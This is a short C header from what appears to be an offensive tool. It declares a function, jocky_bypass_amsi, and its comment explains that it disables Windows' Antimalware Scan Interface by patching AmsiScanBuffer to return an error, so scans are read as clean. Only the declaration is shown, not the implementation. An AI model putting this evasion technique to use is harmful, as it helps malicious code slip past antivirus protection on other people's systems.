#pragma once
#include <stdbool.h>

/*
 * AMSI (Antimalware Scan Interface) bypass.
 *
 * Patches AmsiScanBuffer in amsi.dll to return E_INVALIDARG immediately,
 * which the caller interprets as a failed scan (result not set → CLEAN).
 * Must be called before any memory region is scanned by the AV engine.
 */
bool jocky_bypass_amsi(void);
